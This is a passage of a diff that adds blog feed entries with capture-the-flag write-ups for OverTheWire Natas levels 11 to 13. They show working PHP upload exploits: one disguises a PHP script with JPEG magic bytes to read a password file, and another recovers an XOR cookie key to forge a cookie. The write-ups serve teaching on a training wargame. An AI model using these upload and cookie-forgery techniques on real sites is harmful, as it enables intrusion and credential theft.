+      <link>https://www.mattandreko.com/blog/2012-11-12-overthewire-natas-level-13/</link>
+      <pubDate>Mon, 12 Nov 2012 06:44:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-12-overthewire-natas-level-13/</guid>
+      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas13.shtml&#34;&gt;Level 13&lt;/a&gt; of &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&amp;rsquo;s&lt;/a&gt; Natas wargame is extremely similar to Level 12. The only difference now, is that it&amp;rsquo;s validating that the file is in fact an image. This however is flawed, as exif data can be faked.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts out with a similar upload prompt as last time.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas13_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The source code is super similar to last time.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
+&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
+&amp;lt;body&amp;gt; 
+&amp;lt;h1&amp;gt;natas13&amp;lt;/h1&amp;gt; 
+&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
+For security reasons, we now only accept image files!&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt; 
+
+&amp;lt;?  
+
+function genRandomString() { 
+    $length = 10; 
+    $characters = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;quot;; 
+    $string = &amp;quot;&amp;quot;;     
+
+    for ($p = 0; $p &amp;lt; $length; $p++) { 
+        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
+    } 
+
+    return $string; 
+} 
+
+function makeRandomPath($dir, $ext) { 
+    do { 
+    $path = $dir.&amp;quot;/&amp;quot;.genRandomString().&amp;quot;.&amp;quot;.$ext; 
+    } while(file_exists($path)); 
+    return $path; 
+} 
+
+function makeRandomPathFromFilename($dir, $fn) { 
+    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
+    return makeRandomPath($dir, $ext); 
+} 
+
+if(array_key_exists(&amp;quot;filename&amp;quot;, $_POST)) { 
+    $target_path = makeRandomPathFromFilename(&amp;quot;upload&amp;quot;, $_POST[&amp;quot;filename&amp;quot;]); 
+
+
+        if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &amp;gt; 1000) { 
+        echo &amp;quot;File is too big&amp;quot;; 
+    } else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) { 
+        echo &amp;quot;File is not an image&amp;quot;; 
+    } else { 
+        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) { 
+            echo &amp;quot;The file &amp;lt;a href=\&amp;quot;$target_path\&amp;quot;&amp;gt;$target_path&amp;lt;/a&amp;gt; has been uploaded&amp;quot;;
+        } else{ 
+            echo &amp;quot;There was an error uploading the file, please try again!&amp;quot;; 
+        } 
+    } 
+} else { 
+?&amp;gt; 
+
+&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt; 
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;&amp;lt;? print genRandomString(); ?&amp;gt;.jpg&amp;quot; /&amp;gt; 
+Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt; 
+&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt; 
+&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt; 
+&amp;lt;/form&amp;gt; 
+&amp;lt;? } ?&amp;gt; 
+&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
+&amp;lt;/div&amp;gt; 
+&amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just like last time, I saved the HTML down to my local machine, and made 2 changes, for the url, and the filename.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;natas13&amp;lt;/h1&amp;gt;
+&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
+For security reasons, we now only accept image files!&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
+
+
+&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;http://natas13.natas.labs.overthewire.org/index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt;
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;file.php&amp;quot; /&amp;gt;
+Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt;
+&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;
+&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The main difference to get around the exif changing in this case, is to put the JPEG magic-bytes into the beginning of the file. I found the JPEG magic-bytes by simply googling the &lt;a href=&#34;http://www.digitalpreservation.gov/formats/fdd/fdd000018.shtml&#34;&gt;JPEG&lt;/a&gt; file format&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I first created a small file that contained the magic bytes.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ echo -e &amp;quot;\xff\xd8\xff\xe0&amp;quot; &amp;gt; jpeg_magic
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, I created my PHP script to upload (same as last level, except a new file to read).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$file = file_get_contents(&#39;/etc/natas_webpass/natas14&#39;);
+echo &amp;quot;\n&amp;quot; . $file;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then to combine these files, I just used &amp;ldquo;cat&amp;rdquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ cat jpeg_magic upload.php &amp;gt; upload2.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then uploaded &amp;ldquo;upload2.php&amp;rdquo; using my local HTML form that I created.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas13_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Just like that, it let me past the logic to verify it was an image type. Once I clicked on the link to the uploaded file, it showed me the magic-bytes, followed by the password to the next level.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas13_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 12</title>
+      <link>https://www.mattandreko.com/blog/2012-11-11-overthewire-natas-level-12/</link>
+      <pubDate>Sun, 11 Nov 2012 06:27:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-11-overthewire-natas-level-12/</guid>
+      <description>&lt;p&gt;The next level to attack in the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargame, is &lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas12.shtml&#34;&gt;Level 12&lt;/a&gt;, which is more &amp;ldquo;real-world&amp;rdquo; as well, since developers often forget to limit file extensions.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It starts out giving you the option to upload a &amp;lt;1KB file to the server.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;As with any other challenge, I viewed the source, to analyze it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; 
+&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt; 
+&amp;lt;body&amp;gt; 
+&amp;lt;h1&amp;gt;natas12&amp;lt;/h1&amp;gt; 
+&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt; 
+&amp;lt;?  
+
+function genRandomString() { 
+    $length = 10; 
+    $characters = &amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;quot;; 
+    $string = &amp;quot;&amp;quot;;     
+
+    for ($p = 0; $p &amp;lt; $length; $p++) { 
+        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
+    } 
+
+    return $string; 
+} 
+
+function makeRandomPath($dir, $ext) { 
+    do { 
+    $path = $dir.&amp;quot;/&amp;quot;.genRandomString().&amp;quot;.&amp;quot;.$ext; 
+    } while(file_exists($path)); 
+    return $path; 
+} 
+
+function makeRandomPathFromFilename($dir, $fn) { 
+    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
+    return makeRandomPath($dir, $ext); 
+} 
+
+if(array_key_exists(&amp;quot;filename&amp;quot;, $_POST)) { 
+    $target_path = makeRandomPathFromFilename(&amp;quot;upload&amp;quot;, $_POST[&amp;quot;filename&amp;quot;]); 
+
+
+        if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &amp;gt; 1000) { 
+        echo &amp;quot;File is too big&amp;quot;; 
+    } else { 
+        if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) { 
+            echo &amp;quot;The file &amp;lt;a href=\&amp;quot;$target_path\&amp;quot;&amp;gt;$target_path&amp;lt;/a&amp;gt; has been uploaded&amp;quot;;
+        } else{ 
+            echo &amp;quot;There was an error uploading the file, please try again!&amp;quot;; 
+        } 
+    } 
+} else { 
+?&amp;gt; 
+
+&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt; 
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt; 
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;&amp;lt;? print genRandomString(); ?&amp;gt;.jpg&amp;quot; /&amp;gt; 
+Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt; 
+&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt; 
+&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt; 
+&amp;lt;/form&amp;gt; 
+&amp;lt;? } ?&amp;gt; 
+&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt; 
+&amp;lt;/div&amp;gt; 
+&amp;lt;/body&amp;gt; 
+&amp;lt;/html&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The filename of the uploaded file is a randomly generated .jpg file, based on the hidden input in the HTML. To change that, there are a few ways, but I simply did the old-school method of saving the HTML to my desktop, and modifying it, since there was no code to verify the HTTP Referer. I made the code read:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; type=&amp;quot;text/css&amp;quot; href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;natas12&amp;lt;/h1&amp;gt;
+&amp;lt;div id=&amp;quot;content&amp;quot;&amp;gt;
+
+&amp;lt;form enctype=&amp;quot;multipart/form-data&amp;quot; action=&amp;quot;http://natas12.natas.labs.overthewire.org/index.php&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;MAX_FILE_SIZE&amp;quot; value=&amp;quot;1000&amp;quot; /&amp;gt;
+&amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;filename&amp;quot; value=&amp;quot;hostess.php&amp;quot; /&amp;gt;
+Choose a JPEG to upload (max 1KB):&amp;lt;br/&amp;gt;
+&amp;lt;input name=&amp;quot;uploadedfile&amp;quot; type=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;
+&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Upload File&amp;quot; /&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;div id=&amp;quot;viewsource&amp;quot;&amp;gt;&amp;lt;a href=&amp;quot;index-source.html&amp;quot;&amp;gt;View sourcecode&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I had really only changed the filename to be a .php extension, since it will still be randomly assigned a filename, but keep the extension. The other change was simply to make it submit to the full URL of the site.&lt;/p&gt;
+
+&lt;p&gt;I then opened up the HTML file in my browser, and selected a PHP file that I had made just for this level. It simply reads the password file for the next level, and prints it to the screen. The code for it is as follows:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$file = file_get_contents(&#39;/etc/natas_webpass/natas13&#39;);
+echo $file;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Once that uploaded, it gave me a link to the newly uploaded file.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_3.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Once the newly uploaded file executed, it wrote out the contents of the next level&amp;rsquo;s password.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas12_4.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+</description>
+    </item>
+    
+    <item>
+      <title>OverTheWire Natas Level 11</title>
+      <link>https://www.mattandreko.com/blog/2012-11-10-overthewire-natas-level-11/</link>
+      <pubDate>Sat, 10 Nov 2012 05:34:00 -0500</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-11-10-overthewire-natas-level-11/</guid>
+      <description>&lt;p&gt;&lt;a href=&#34;http://www.overthewire.org/wargames/natas/natas11.shtml&#34;&gt;Level 11&lt;/a&gt; of the &lt;a href=&#34;http://www.overthewire.org&#34;&gt;OverTheWire&lt;/a&gt; Natas wargames is a good one. It wasn&amp;rsquo;t one that could instantly be solved either. It involved programming, encryption, and HTTP. All fun!&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;It started with a dialog to set the background color. When you click the &amp;ldquo;Set Color&amp;rdquo; button, it sets a cookie in your browser. But as the dialog says, the cookie is protected.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas11_1.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I looked at the source code, as I always do. It was a little more lengthy than previous levels.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;amp;lt;html&amp;amp;gt;
+&amp;amp;lt;head&amp;amp;gt;&amp;amp;lt;link&amp;amp;nbsp;rel=&amp;quot;stylesheet&amp;quot;&amp;amp;nbsp;type=&amp;quot;text/css&amp;quot;&amp;amp;nbsp;href=&amp;quot;http://www.overthewire.org/wargames/natas/level.css&amp;quot;&amp;amp;gt;&amp;amp;lt;/head&amp;amp;gt;
+&amp;amp;lt;?
+
+$defaultdata&amp;amp;nbsp;=&amp;amp;nbsp;array(&amp;amp;nbsp;&amp;quot;showpassword&amp;quot;=&amp;amp;gt;&amp;quot;no&amp;quot;,&amp;amp;nbsp;&amp;quot;bgcolor&amp;quot;=&amp;amp;gt;&amp;quot;#ffffff&amp;quot;);
+
+function&amp;amp;nbsp;xor_encrypt($in)&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$key&amp;amp;nbsp;=&amp;amp;nbsp;&#39;&amp;amp;lt;censored&amp;amp;gt;&#39;;
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$text&amp;amp;nbsp;=&amp;amp;nbsp;$in;
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;=&amp;amp;nbsp;&#39;&#39;;
+
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;//&amp;amp;nbsp;Iterate&amp;amp;nbsp;through&amp;amp;nbsp;each&amp;amp;nbsp;character
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;for($i=0;$i&amp;amp;lt;strlen($text);$i++)&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;.=&amp;amp;nbsp;$text[$i]&amp;amp;nbsp;^&amp;amp;nbsp;$key[$i&amp;amp;nbsp;%&amp;amp;nbsp;strlen($key)];
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
+
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;return&amp;amp;nbsp;$outText;
+}
+
+function&amp;amp;nbsp;loadData($def)&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;global&amp;amp;nbsp;$_COOKIE;
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$mydata&amp;amp;nbsp;=&amp;amp;nbsp;$def;
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if(array_key_exists(&amp;quot;data&amp;quot;,&amp;amp;nbsp;$_COOKIE))&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$tempdata&amp;amp;nbsp;=&amp;amp;nbsp;json_decode(xor_encrypt(base64_decode($_COOKIE[&amp;quot;data&amp;quot;])),&amp;amp;nbsp;true);
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if(is_array($tempdata)&amp;amp;nbsp;&amp;amp;amp;&amp;amp;amp;&amp;amp;nbsp;array_key_exists(&amp;quot;showpassword&amp;quot;,&amp;amp;nbsp;$tempdata)&amp;amp;nbsp;&amp;amp;amp;&amp;amp;amp;&amp;amp;nbsp;array_key_exists(&amp;quot;bgcolor&amp;quot;,&amp;amp;nbsp;$tempdata))&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if&amp;amp;nbsp;(preg_match(&#39;/^#(?:[a-f\d]{6})$/i&#39;,&amp;amp;nbsp;$tempdata[&#39;bgcolor&#39;]))&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$mydata[&#39;showpassword&#39;]&amp;amp;nbsp;=&amp;amp;nbsp;$tempdata[&#39;showpassword&#39;];
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$mydata[&#39;bgcolor&#39;]&amp;amp;nbsp;=&amp;amp;nbsp;$tempdata[&#39;bgcolor&#39;];
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;return&amp;amp;nbsp;$mydata;
+}
+
+function&amp;amp;nbsp;saveData($d)&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;setcookie(&amp;quot;data&amp;quot;,&amp;amp;nbsp;base64_encode(xor_encrypt(json_encode($d))));
+}
+
+$data&amp;amp;nbsp;=&amp;amp;nbsp;loadData($defaultdata);
+
+if(array_key_exists(&amp;quot;bgcolor&amp;quot;,$_REQUEST))&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;if&amp;amp;nbsp;(preg_match(&#39;/^#(?:[a-f\d]{6})$/i&#39;,&amp;amp;nbsp;$_REQUEST[&#39;bgcolor&#39;]))&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$data[&#39;bgcolor&#39;]&amp;amp;nbsp;=&amp;amp;nbsp;$_REQUEST[&#39;bgcolor&#39;];
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;}
+}
+
+saveData($data);
+
+
+
+?&amp;amp;gt;
+
+&amp;amp;lt;h1&amp;amp;gt;natas11&amp;amp;lt;/h1&amp;amp;gt;
+&amp;amp;lt;div&amp;amp;nbsp;id=&amp;quot;content&amp;quot;&amp;amp;gt;
+&amp;amp;lt;body&amp;amp;nbsp;style=&amp;quot;background:&amp;amp;nbsp;&amp;amp;lt;?=$data[&#39;bgcolor&#39;]?&amp;amp;gt;;&amp;quot;&amp;amp;gt;
+Cookies&amp;amp;nbsp;are&amp;amp;nbsp;protected&amp;amp;nbsp;with&amp;amp;nbsp;XOR&amp;amp;nbsp;encryption&amp;amp;lt;br/&amp;amp;gt;&amp;amp;lt;br/&amp;amp;gt;
+
+&amp;amp;lt;?
+if($data[&amp;quot;showpassword&amp;quot;]&amp;amp;nbsp;==&amp;amp;nbsp;&amp;quot;yes&amp;quot;)&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;print&amp;amp;nbsp;&amp;quot;The&amp;amp;nbsp;password&amp;amp;nbsp;for&amp;amp;nbsp;natas12&amp;amp;nbsp;is&amp;amp;nbsp;&amp;amp;lt;censored&amp;amp;gt;&amp;amp;lt;br&amp;amp;gt;&amp;quot;;
+}
+
+?&amp;amp;gt;
+
+&amp;amp;lt;form&amp;amp;gt;
+Background&amp;amp;nbsp;color:&amp;amp;nbsp;&amp;amp;lt;input&amp;amp;nbsp;name=bgcolor&amp;amp;nbsp;value=&amp;quot;&amp;amp;lt;?=$data[&#39;bgcolor&#39;]?&amp;amp;gt;&amp;quot;&amp;amp;gt;
+&amp;amp;lt;input&amp;amp;nbsp;type=submit&amp;amp;nbsp;value=&amp;quot;Set&amp;amp;nbsp;color&amp;quot;&amp;amp;gt;
+&amp;amp;lt;/form&amp;amp;gt;
+
+&amp;amp;lt;div&amp;amp;nbsp;id=&amp;quot;viewsource&amp;quot;&amp;amp;gt;&amp;amp;lt;a&amp;amp;nbsp;href=&amp;quot;index-source.html&amp;quot;&amp;amp;gt;View&amp;amp;nbsp;sourcecode&amp;amp;lt;/a&amp;amp;gt;&amp;amp;lt;/div&amp;amp;gt;
+&amp;amp;lt;/div&amp;amp;gt;
+&amp;amp;lt;/body&amp;amp;gt;
+&amp;amp;lt;/html&amp;amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I viewed my cookie, using the amazing, &lt;a href=&#34;https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg&#34;&gt;Edit This Cookie&lt;/a&gt;, Chrome extension. Note that the last character is a &amp;ldquo;=&amp;rdquo;, but it&amp;rsquo;s encoded in the cookie as &amp;ldquo;%3D&amp;rdquo; due to encoding.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/natas11_2.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I then took this cookie value and figured that maybe I could decode it. XOR encryption is reversible if you know &lt;sup&gt;2&lt;/sup&gt;&amp;frasl;&lt;sub&gt;3&lt;/sub&gt; parts. You have A XOR KEY = C, for example. If you know A and C, you can derive KEY by XORing A and C together the same way. I ended up writing some code in PHP (since the original was in PHP)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;amp;lt;?php
+
+function find_xor_key($decrypted, $encrypted) {
+ // This value should be the return of xor_encrypt with a base64 decode
+ $base64_decoded = base64_decode($encrypted);
+
+ // Before xoring, get the decrypted value into the same state it was
+ $json_encoded = json_encode($decrypted);
+
+ $outText = &#39;&#39;;
+
+ for($i=0; $i &amp;amp;lt; strlen($json_encoded); $i++) {
+  $outText .= $json_encoded[$i] ^ $base64_decoded[$i % strlen($base64_decoded)];
+ } 
+
+ return $outText;
+}
+
+$cookie = array(&amp;quot;showpassword&amp;quot;=&amp;amp;gt;&amp;quot;no&amp;quot;, &amp;quot;bgcolor&amp;quot;=&amp;amp;gt;&amp;quot;#ffffff&amp;quot;);
+
+$key = find_xor_key($cookie, &amp;quot;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=&amp;quot;) . &amp;quot;\n&amp;quot;;
+
+print &amp;quot;XOR Key: &amp;quot; . $key . &amp;quot;\n&amp;quot;;
+
+?&amp;amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When ran, this produces the following.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko$ php natas11_decode.php 
+XOR Key: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now I know that the XOR key is &amp;ldquo;qw8J&amp;rdquo;.  It&amp;rsquo;s repeated over and over, because the string it&amp;rsquo;s encoding is longer than the key, so it gets repeated, otherwise it&amp;rsquo;d be XOR to nothing.&lt;/p&gt;
+
+&lt;p&gt;I then took this XOR key and tried to use it to encode a new cookie value, so that I could switch the &amp;ldquo;showpassword&amp;rdquo; value to &amp;ldquo;yes&amp;rdquo;.  I wrote the following script to do so.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;amp;lt;?php
+
+function&amp;amp;nbsp;custom_xor($key,&amp;amp;nbsp;$in)&amp;amp;nbsp;{
+&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;$outText&amp;amp;nbsp;=&amp;amp;nbsp;&#39;&#39;;
